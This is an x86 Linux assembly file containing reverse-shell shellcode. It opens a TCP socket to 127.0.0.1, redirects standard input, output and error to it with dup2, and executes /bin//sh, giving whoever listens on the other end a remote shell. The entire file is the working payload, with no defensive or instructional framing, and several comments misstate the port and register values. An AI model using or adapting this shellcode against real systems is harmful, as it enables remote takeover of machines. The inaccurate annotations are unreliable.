BITS  32

; s = socket( 2, 1, 0 )
push BYTE 0x66      ; socketcall 102 = socket()
pop  eax            ;
cdq                 ; zero out EDX
xor  ebx,ebx        ; EBX = 0
inc  ebx            ; EBX = 1 = SYS_SOCKET
push edx            ; build args { protocol    = 0
push BYTE 0x1       ;              SOCK_STREAM = 1
push BYTE 0x2       ;              AF_INET     = 2 }
mov  ecx,esp        ; ECX = ptr to argv[]
int  0x80           ; syscall , EAX have sockfd

xchg esi,eax        ; Save sockfd in ESI for later use

; connect( s, [2,31337,<IP ADDRESS>], 16 )
push BYTE 0x66      ; socketcall #102
pop  eax            ;
inc  ebx            ; EBx = 2 for AF_INET
push DWORD 0x01BBBB7f  ; build sockaddr struct{ IP     = 127.0.0.1
mov  WORD [esp+1],dx; Overwrite BBBB to 0000 in above
push WORD 0x697a    ;                           PORT    = 31117
push WORD bx        ;                           AF_INET = 2 }
mov  ecx,esp        ; ECX points struct
push BYTE 16        ; argv { sizeof(struct) = 16
push ecx            ;        struct ptr
push esi            ;        sockfd }
mov  ecx,esp        ; ECX = argv[]
inc  ebx            ; EBX = 3 = SYS_CONNECT
int  0x80           ;

; dup2( connect sockfd, new sockfd )
xchg eax,ebx        ; put sockfd in EAX and 5 in EAX
push BYTE 0x2       ;  ECX = 2
pop  ecx            ;
dup_loop:
mov  BYTE al,0x3f   ; syscall #63
int  0x80           ; dup2( c, 0 )
dec  ecx            ; count down to 0
jns  dup_loop       ; if sign flag isn't set jump . i.e ECX isn't negative

; execve ( filename, argv[], envp[] )
mov  BYTE al,11     ; syscall #11
push edx            ; 0 for NULL termination
push 0x68732f2f     ; push //sh
push 0x6e69622f     ; push //bin
mov  ebx,esp        ; EBX points /bin//sh
push edx            ; push 0 for NULL
mov  edx,esp        ; EDX = NULL = envp[]
push ebx            ; push /bin//sh to top
mov  ecx,esp        ; argv[]
int  0x80           ; execve( "/bin//sh", ["/bin//sh,NULL"],NULL)
